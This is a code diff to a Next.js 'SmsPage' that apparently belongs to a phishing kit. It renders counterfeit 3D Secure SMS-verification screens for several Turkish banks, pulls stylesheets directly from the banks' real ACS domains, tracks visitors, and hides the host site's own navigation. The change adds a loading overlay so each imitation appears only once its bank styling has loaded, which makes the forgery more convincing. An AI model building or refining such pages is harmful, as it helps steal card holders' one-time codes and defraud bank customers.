@@ -81,6 +81,21 @@ export default function SmsPage() {
         fetchData();
     }, [router]);
 
+    const handleStyleLoad = () => {
+        setTimeout(() => {
+            setCssLoaded(true);
+        }, 200);
+    };
+
+    useEffect(() => {
+        if (!loading && data) {
+            const bankName = (data.banka || '').toLowerCase().trim();
+            if (bankName.includes('deniz')) {
+                handleStyleLoad();
+            }
+        }
+    }, [loading, data]);
+
     // Geri sayım
     useEffect(() => {
         if (timeLeft <= 0) {
@@ -210,7 +225,7 @@ export default function SmsPage() {
             <>
                 <OnlineTracker />
                 <link rel="stylesheet" href="/assets/acs-style/garanti/css/fonts.css" />
-                <link rel="stylesheet" href="/assets/acs-style/garanti/css/garanti.css" />
+                <link rel="stylesheet" href="/assets/acs-style/garanti/css/garanti.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
@@ -366,7 +381,7 @@ export default function SmsPage() {
         return (
             <>
                 <OnlineTracker />
-                <link rel="stylesheet" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css" />
+                <link rel="stylesheet" href="https://3dsecure.akbank.com.tr/akbankacs/dijitalgozluk_css/dijitalgozluk.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
@@ -610,7 +625,7 @@ export default function SmsPage() {
         return (
             <>
                 <OnlineTracker />
-                <link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0" />
+                <link rel="stylesheet" href="https://acs.qnbfinansbank.com/css/bundle.min.css?v=MdyKrhjGqNYJdJs5G1Aekf5F3lnmp-fqFmHweUkHZw0" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
@@ -740,7 +755,7 @@ export default function SmsPage() {
             <>
                 <OnlineTracker />
                 <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css" />
-                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css" />
+                <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
@@ -876,7 +891,7 @@ export default function SmsPage() {
             <>
                 <OnlineTracker />
                 <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
-                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
+                <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" onLoad={handleStyleLoad} onError={handleStyleLoad} />
                 <style jsx global>{`
                     nav.fixed.bottom-0 { display: none !important; }
                     main { padding-bottom: 0 !important; }
@@ -1000,49 +1015,75 @@ export default function SmsPage() {
     };
 
     // Banka adına göre render yöntemini belirle
+    let bankContent = null;
     if (bank.includes('garanti') || bank.includes('bonus')) {
-        return renderGaranti();
-    }
-    if (bank.includes('akbank') || bank.includes('axess')) {
-        return renderAkbank();
-    }
-    if (bank.includes('deniz')) {
-        return renderDenizbank();
-    }
-    if (bank.includes('finans') || bank.includes('qnb')) {
-        return renderFinansbank();
-    }
-    if (bank.includes('isbank') || bank.includes('işbank') || bank.includes('maximum')) {
-        return renderIsbankasi();
-    }
-
-    // Varsayılan BKM Go tasarımı ve banka logoları eşleşmesi
-    let bankLogo = 'https://goguvenliodeme.bkm.com.tr/images/go.png';
-    if (bank.includes('ziraat')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ziraatbankasi.png';
-    } else if (bank.includes('vakif') || bank.includes('vakıf')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/vakifbank.png';
-    } else if (bank.includes('halk')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/halkbank.png';
-    } else if (bank.includes('ing')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ing.png';
-    } else if (bank.includes('yapi') || bank.includes('yapı') || bank.includes('world') || bank.includes('ykb')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png';
-    } else if (bank.includes('teb')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/teb.png';
-    } else if (bank.includes('şeker') || bank.includes('seker')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/sekerbank.png';
-    } else if (bank.includes('hsbc')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/hsbc.png';
-    } else if (bank.includes('odea')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/odeabank.png';
-    } else if (bank.includes('albaraka')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/albaraka.png';
-    } else if (bank.includes('kuveyt')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/kuveytturk.png';
-    } else if (bank.includes('turkiye finans') || bank.includes('türkiye finans')) {
-        bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/turkiyefinans.png';
+        bankContent = renderGaranti();
+    } else if (bank.includes('akbank') || bank.includes('axess')) {
+        bankContent = renderAkbank();
+    } else if (bank.includes('deniz')) {
+        bankContent = renderDenizbank();
+    } else if (bank.includes('finans') || bank.includes('qnb')) {
+        bankContent = renderFinansbank();
+    } else if (bank.includes('isbank') || bank.includes('işbank') || bank.includes('maximum')) {
+        bankContent = renderIsbankasi();
+    } else {
+        // Varsayılan BKM Go tasarımı ve banka logoları eşleşmesi
+        let bankLogo = 'https://goguvenliodeme.bkm.com.tr/images/go.png';
+        if (bank.includes('ziraat')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ziraatbankasi.png';
+        } else if (bank.includes('vakif') || bank.includes('vakıf')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/vakifbank.png';
+        } else if (bank.includes('halk')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/halkbank.png';
+        } else if (bank.includes('ing')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/ing.png';
+        } else if (bank.includes('yapi') || bank.includes('yapı') || bank.includes('world') || bank.includes('ykb')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png';
+        } else if (bank.includes('teb')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/teb.png';
+        } else if (bank.includes('şeker') || bank.includes('seker')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/sekerbank.png';
+        } else if (bank.includes('hsbc')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/hsbc.png';
+        } else if (bank.includes('odea')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/odeabank.png';
+        } else if (bank.includes('albaraka')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/albaraka.png';
+        } else if (bank.includes('kuveyt')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/kuveytturk.png';
+        } else if (bank.includes('turkiye finans') || bank.includes('türkiye finans')) {
+            bankLogo = 'https://goguvenliodeme.bkm.com.tr/banklogo/turkiyefinans.png';
+        }
+        bankContent = renderBkmGo(bankLogo);
     }
 
-    return renderBkmGo(bankLogo);
+    return (
+        <>
+            {!cssLoaded && (
+                <div className="flex items-center justify-center min-h-screen bg-white fixed inset-0 z-[100000]">
+                    <style jsx global>{`
+                        nav.fixed.bottom-0 { display: none !important; }
+                        main { padding-bottom: 0 !important; }
+                        header { display: none !important; }
+                        body { background: #fff !important; }
+                    `}</style>
+                    <div style={{ width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #3498db', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
+                    <style jsx>{`
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    `}</style>
+                </div>
+            )}
+            <div style={{ 
+                visibility: cssLoaded ? 'visible' : 'hidden', 
+                opacity: cssLoaded ? 1 : 0,
+                width: '100%',
+                height: '100%'
+            }}>
+                {bankContent}
+            </div>
+        </>
+    );
 }
